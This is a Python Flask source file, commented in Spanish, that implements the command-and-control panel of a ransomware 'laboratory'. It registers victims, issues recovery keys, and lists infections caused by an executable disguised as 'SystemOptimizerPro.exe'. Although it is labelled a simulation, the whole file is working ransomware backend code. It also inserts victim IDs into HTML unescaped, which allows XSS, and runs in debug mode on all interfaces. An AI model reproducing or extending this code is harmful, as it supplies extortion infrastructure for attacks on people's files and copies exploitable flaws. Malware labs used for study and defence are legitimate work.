from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime
import hashlib
import os

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, 
                  timestamp TEXT,
                  recovery_key TEXT,
                  status TEXT)''')
    conn.commit()
    conn.close()
    print("✅ Base de datos de víctimas inicializada")

@app.route('/')
def dashboard():
    """Dashboard principal mejorado"""
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY timestamp DESC")
    victims = c.fetchall()
    conn.close()
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Panel de Control - Laboratorio Ransomware</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 1000px; margin: 0 auto; }
            .header { background: #2c3e50; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .victim-card { background: white; padding: 15px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .key { background: #e8f5e8; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 16px; }
            .btn { background: #3498db; color: white; padding: 10px 15px; text-decoration: none; border-radius: 5px; display: inline-block; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 Panel de Control - Laboratorio Ransomware</h1>
                <p>Monitoreo de infecciones simuladas</p>
            </div>
    """
    
    if victims:
        html += f"<h2>📊 Víctimas Registradas: {len(victims)}</h2>"
        
        for victim in victims:
            victim_id, timestamp, recovery_key, status = victim
            
            html += f"""
            <div class="victim-card">
                <h3>💻 {victim_id}</h3>
                <p><strong>🕐 Hora de infección:</strong> {timestamp}</p>
                <p><strong>🔑 Clave de Recuperación:</strong></p>
                <div class="key">{recovery_key}</div>
                <p><strong>📊 Estado:</strong> {status}</p>
                <div style="margin-top: 10px;">
                    <a href="/recover/{victim_id}" class="btn">🔓 Generar Herramienta de Recuperación</a>
                    <a href="/delete/{victim_id}" class="btn" style="background: #e74c3c;">🗑️ Eliminar</a>
                </div>
            </div>
            """
    else:
        html += """
        <div class="victim-card">
            <h3>📭 No hay víctimas registradas</h3>
            <p>Cuando un usuario ejecute el EXE simulado, aparecerá aquí automáticamente.</p>
            <p><strong>Próximos pasos:</strong></p>
            <ol>
                <li>Ejecuta el servidor Flask (ya lo estás haciendo)</li>
                <li>Ejecuta SystemOptimizerPro.exe en la VM</li>
                <li>La víctima aparecerá aquí automáticamente</li>
                <li>Copia la clave de recuperación</li>
                <li>Úsala en la herramienta de recuperación</li>
            </ol>
        </div>
        """
    
    html += """
        </div>
    </body>
    </html>
    """
    
    return html

@app.route('/register_victim', methods=['POST'])
def register_victim():
    """Registrar nueva víctima - MEJORADO"""
    try:
        data = request.json
        victim_id = data.get('victim_id', 'UNKNOWN')
        
        print(f"🎯 NUEVA VÍCTIMA DETECTADA: {victim_id}")
        
        # Generar clave de recuperación más legible
        import random
        import string
        
        # Clave formato: RECOVERY_XXXX_XXXX
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        recovery_key = f"RECOVERY_{random_part[:4]}_{random_part[4:]}"
        
        # Guardar en base de datos
        conn = sqlite3.connect('victims.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?)",
                  (victim_id, datetime.now().isoformat(), recovery_key, 'infected'))
        conn.commit()
        conn.close()
        
        print(f"🔑 CLAVE GENERADA PARA {victim_id}: {recovery_key}")
        print(f"📊 Ver víctimas en: http://localhost:5000/")
        
        return jsonify({
            'status': 'success',
            'message': 'Víctima registrada correctamente',
            'recovery_key': recovery_key,
            'victim_id': victim_id,
            'dashboard_url': 'http://localhost:5000/'
        })
        
    except Exception as e:
        print(f"❌ ERROR registrando víctima: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/victims')
def list_victims():
    """Lista simple de víctimas (API)"""
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY timestamp DESC")
    victims = c.fetchall()
    conn.close()
    
    return jsonify({
        'total_victims': len(victims),
        'victims': [
            {
                'id': v[0],
                'timestamp': v[1],
                'recovery_key': v[2],
                'status': v[3]
            } for v in victims
        ]
    })

@app.route('/recover/<victim_id>')
def recover_victim(victim_id):
    """Página de recuperación MEJORADA"""
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims WHERE id = ?", (victim_id,))
    victim = c.fetchone()
    conn.close()
    
    if victim:
        victim_id, timestamp, recovery_key, status = victim
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>🔓 Recuperación - {victim_id}</title>
            <style>
                body {{ font-family: Arial; margin: 40px; }}
                .key {{ background: #e8f5e8; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 18px; margin: 10px 0; }}
                .instruction {{ background: #fff3cd; padding: 15px; border-radius: 5px; margin: 10px 0; }}
            </style>
        </head>
        <body>
            <h1>🔓 Herramienta de Recuperación</h1>
            
            <div class="instruction">
                <h3>📋 Para recuperar los archivos de {victim_id}:</h3>
                <ol>
                    <li><strong>Descarga</strong> la herramienta de recuperación</li>
                    <li><strong>Ejecuta</strong> SystemRecoveryTool.exe en la máquina afectada</li>
                    <li><strong>Ingresa esta clave:</strong></li>
                </ol>
            </div>
            
            <h2>🔑 Clave de Recuperación:</h2>
            <div class="key">{recovery_key}</div>
            
            <div class="instruction">
                <h3>🎯 Instrucciones completas:</h3>
                <ol>
                    <li>Ejecuta SystemRecoveryTool.exe como Administrador</li>
                    <li>Pega la clave: <strong>{recovery_key}</strong></li>
                    <li>Selecciona la carpeta donde están los archivos .encrypted</li>
                    <li>Haz click en "🔍 Buscar Archivos Afectados"</li>
                    <li>Haz click en "🔓 Recuperar Archivos"</li>
                    <li>¡Listo! Los archivos serán restaurados</li>
                </ol>
            </div>
            
            <p><a href="/">← Volver al Panel de Control</a></p>
        </body>
        </html>
        """
    else:
        return "<h1>❌ Víctima no encontrada</h1>"

@app.route('/delete/<victim_id>')
def delete_victim(victim_id):
    """Eliminar víctima de la base de datos"""
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("DELETE FROM victims WHERE id = ?", (victim_id,))
    conn.commit()
    conn.close()
    
    return f"""
    <html>
    <body>
        <h1>✅ Víctima eliminada</h1>
        <p>La víctima {victim_id} ha sido eliminada de la base de datos.</p>
        <a href="/">← Volver al Panel de Control</a>
    </body>
    </html>
    """

if __name__ == '__main__':
    init_db()
    print("🚀 SERVIDOR DE CONTROL INICIADO")
    print("📍 Panel Principal: http://localhost:5000")
    print("📋 Lista de Víctimas: http://localhost:5000/victims")
    print("")
    print("🎯 PRÓXIMOS PASOS:")
    print("   1. Ejecuta SystemOptimizerPro.exe en la VM")
    print("   2. La víctima aparecerá automáticamente en el panel")
    print("   3. Copia la clave de recuperación")
    print("   4. Usa SystemRecoveryTool.exe con esa clave")
    print("")
    app.run(host='0.0.0.0', port=5000, debug=True)